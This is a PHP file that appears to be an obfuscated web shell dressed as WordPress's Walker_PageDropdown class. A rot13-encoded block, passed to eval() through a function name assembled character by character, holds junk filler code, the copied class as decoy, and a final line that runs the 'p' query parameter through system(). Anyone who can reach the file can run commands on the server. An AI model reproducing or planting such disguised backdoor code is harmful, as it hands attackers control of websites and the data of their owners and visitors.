<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cbfg NCV: Jnyxre_CntrQebcqbja pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Cbfg
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb perngr na UGZY qebc-qbja yvfg bs cntrf.
 *
 * @fvapr 2.1.0
 *
 * @frr Jnyxre
 */
pynff Jnyxre_CntrQebcqbja rkgraqf Jnyxre {

	/**
	 * Jung gur pynff unaqyrf.
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat
	 *
	 * @frr Jnyxre::$gerr_glcr
	 */
	choyvp $gerr_glcr = 'cntr';

	/**
	 * Qngnonfr svryqf gb hfr.
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat[]
	 *
	 * @frr Jnyxre::$qo_svryqf
	 * @gbqb Qrpbhcyr guvf
	 */
	choyvp $qo_svryqf = neenl(
		'cnerag' => 'cbfg_cnerag',
		'vq'     => 'VQ',
	);

	/**
	 * Fgnegf gur ryrzrag bhgchg.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 5.9.0 Eranzrq `$cntr` gb `$qngn_bowrpg` naq `$vq` gb `$pheerag_bowrpg_vq`
	 *              gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @frr Jnyxre::fgneg_ry()
	 *
	 * @cnenz fgevat  $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag. Cnffrq ol ersrerapr.
	 * @cnenz JC_Cbfg $qngn_bowrpg       Cntr qngn bowrpg.
	 * @cnenz vag     $qrcgu             Bcgvbany. Qrcgu bs cntr va ersrerapr gb cnerag cntrf.
	 *                                   Hfrq sbe cnqqvat. Qrsnhyg 0.
	 * @cnenz neenl   $netf              Bcgvbany. Hfrf 'fryrpgrq' nethzrag sbe fryrpgrq cntr gb
	 *                                   frg fryrpgrq UGZY nggevohgr sbe bcgvba ryrzrag. Hfrf
	 *                                   'inyhr_svryq' nethzrag gb svyy \"inyhr\" nggevohgr.
	 *                                   Frr jc_qebcqbja_cntrf(). Qrsnhyg rzcgl neenl.
	 * @cnenz vag     $pheerag_bowrpg_vq Bcgvbany. VQ bs gur pheerag cntr. Qrsnhyg 0.
	 */
	choyvp shapgvba fgneg_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl(), $pheerag_bowrpg_vq = 0 ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cntr = $qngn_bowrpg;

		$cnq = fge_ercrng( '&aofc;', $qrcgu * 3 );

		vs ( ! vffrg( $netf['inyhr_svryq'] ) || ! vffrg( $cntr->{$netf['inyhr_svryq']} ) ) {
			$netf['inyhr_svryq'] = 'VQ';
		}

		$bhgchg .= \"\g<bcgvba pynff=\\"yriry-$qrcgu\\" inyhr=\\"\" . rfp_ngge( $cntr->{$netf['inyhr_svryq']} ) . '\"';
		vs ( $cntr->VQ === (vag) $netf['fryrpgrq'] ) {
			$bhgchg .= ' fryrpgrq=\"fryrpgrq\"';
		}
		$bhgchg .= '>';

		$gvgyr = $cntr->cbfg_gvgyr;
		vs ( '' === $gvgyr ) {
			/* genafyngbef: %q: VQ bs n cbfg. */
			$gvgyr = fcevags( __( '#%q (ab gvgyr)' ), $cntr->VQ );
		}

		/**
		 * Svygref gur cntr gvgyr jura perngvat na UGZY qebc-qbja yvfg bs cntrf.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat  $gvgyr Cntr gvgyr.
		 * @cnenz JC_Cbfg $cntr  Cntr qngn bowrpg.
		 */
		$gvgyr = nccyl_svygref( 'yvfg_cntrf', $gvgyr, $cntr );

		$bhgchg .= $cnq . rfp_ugzy( $gvgyr );
		$bhgchg .= \"</bcgvba>\a\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>